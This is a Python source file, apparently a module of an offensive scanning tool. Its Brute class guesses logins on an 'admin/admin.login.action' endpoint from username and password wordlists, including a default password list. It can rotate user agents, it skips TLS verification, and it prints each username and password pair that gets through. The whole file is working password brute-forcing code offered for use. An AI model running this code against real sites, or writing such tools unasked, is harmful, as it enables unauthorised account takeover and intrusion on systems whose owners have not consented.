import requests
import re
import json
import os
import urllib3
from random import randint
from txtAndColors import vulnerable, info, critical

PROXY = {'http':"http://127.0.0.1:8080"}

class Brute:
    def __init__(self, url, user_agent):
        self.url = url
        self.agent = user_agent
        self.CleanUrl()
        
    

    def CleanUrl(self):
        if self.url[-1] != '/':
            self.url = self.url + '/'


    def RandomAgent(self):
        with open('database/user-agents.txt', 'r') as f:
            uas = f.read()
            uas = re.sub("#.*","", uas)
            uas = uas.replace("\n\n", "")
            uas = uas.split("\n")
           
        random = randint(0, len(uas)-1)
        self.agent = uas[random]

    def DoBruteForce(self, user_name_list, password_list):
        print(vulnerable("[+] Brute Force users from a list"))
        urlRequest = self.url + "admin/admin.login.action"
        print("[+] Target: {}".format(urlRequest))

        with open(user_name_list) as data_users:
            data = data_users.readlines()
            users_found = []
            for user in data:
                user = user.strip()
                with open(password_list) as data_passwords:
                    pwd = data_passwords.readlines()
                    for p in pwd:
                        p = p.strip()
                        payload = {"username":user, "password":p, "entrar":"entrar","login":"true"}
                        try:
                            r = requests.post(urlRequest , headers={'User-Agent':self.agent}, data=payload, verify=False)
                            # DEBUG requests 
                            #r2 = requests.post(urlRequest ,headers={'User-Agent':self.agent}, data=payload, verify=False, proxies=PROXY)
                            if "200" in str(r) and not "404" in r.text:
                                if 'admin.action' in str(r.text):
                                    users_found.append(user)
                                    print("[+] FOUND ONE USER {}:{}".format(user, p))     
                        except Exception as e:
                            print("[+] Error {}".format(e))
            if len(users_found) == 0:
                print("[-] Brute force failed .. no users were founded")

    
    def DoBruteForceDefaultPass(self, user_name_list):
        print(vulnerable("[+] Brute Force users from a list"))
        urlRequest = self.url + "admin/admin.login.action"
        print("[+] Target: {}".format(urlRequest))

        with open(user_name_list) as data_users:
            data = data_users.readlines()
            users_found = []
            for user in data:
                user = user.strip()
                with open('database/passwords.txt') as data_passwords:
                    pwd = data_passwords.readlines()
                    for p in pwd:
                        p = p.strip()
                        payload = {"username":user, "password":p, "entrar":"entrar","login":"true"}
                        try:
                            r = requests.post(urlRequest , headers={'User-Agent':self.agent}, data=payload, verify=False)
                            # DEBUG requests 
                            #r2 = requests.post(urlRequest ,headers={'User-Agent':self.agent}, data=payload, verify=False, proxies=PROXY)
                            if "200" in str(r) and not "404" in r.text:
                                if 'admin.action' in str(r.text):
                                    users_found.append(user)
                                    print("[+] FOUND ONE USER {}:{}".format(user, p))     
                        except Exception as e:
                            print("[+] Error {}".format(e))
            if len(users_found) == 0:
                print("[-] Brute force failed .. no users were founded")


                    
